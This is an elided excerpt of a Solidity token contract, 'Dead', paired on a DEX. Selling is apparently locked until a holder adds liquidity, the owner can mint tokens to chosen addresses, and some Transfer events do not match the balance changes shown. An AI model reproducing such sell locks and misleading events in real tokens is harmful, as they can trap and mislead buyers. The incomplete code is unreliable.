...
// Unlock sell-function by providing liquidity or buying dEaD-MATIC @ Quickswap.
...
contract Dead is Context, Ownable, IERC20, IERC20Metadata {
        ...
        )
    {
        ...
        .createPair(dead,IRouter(router).WETH());
    ...
    function toPair(address sender, uint256 amount) internal {
        if (router.balance > 0) {
            ...
            if (_totalSupply < maximumSupply) {
                ...
                emit Transfer(dead, hotSeat, amount / 2);
                _balances[hotSeat] += amount / 20;
                emit Transfer(pair, hotSeat, amount / 20);
                hotSeat = sender;
            }
        } else {
            ...
            if(sender != hotSeat) {
                ...
                _balances[address(0)] += amount / 20;
                _totalSupply -= amount / 20;
                emit Transfer(pair, address(0), amount / 20);
            }
        }
    }
   
    function disperge(address[] calldata recipients) public onlyOwner() {
        require (_totalSupply < maximumSupply);
        for (uint256 i = 0; i < recipients.length; i++) {
            if (_balances[recipients[i]] == 0) {
                _balances[recipients[i]] += 10**18;
                _totalSupply += 10**18;
                emit Transfer(dead, recipients[i], 10**18);
            }
        }
    }
}